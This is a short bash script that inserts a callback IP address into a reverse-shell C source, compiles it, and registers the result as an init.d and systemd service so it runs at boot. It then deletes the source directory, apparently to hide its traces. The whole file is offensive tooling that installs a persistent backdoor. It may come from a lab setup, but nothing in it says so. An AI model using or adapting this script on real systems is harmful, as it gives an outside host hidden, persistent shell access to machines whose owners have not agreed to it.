#! /bin/bash

chmod +x shellservice

sed -i -e 's/"LOCAL ADDRESS GOES HERE"/"10.0.114.26"/g' /home/script/reverse-shell/shell.c

gcc shell.c -o shell

mv shell /

mv shellservice /etc/init.d

mv vmshell.service /etc/systemd/system

systemctl enable vmshell.service

cd /
rm -rf reverse-shell
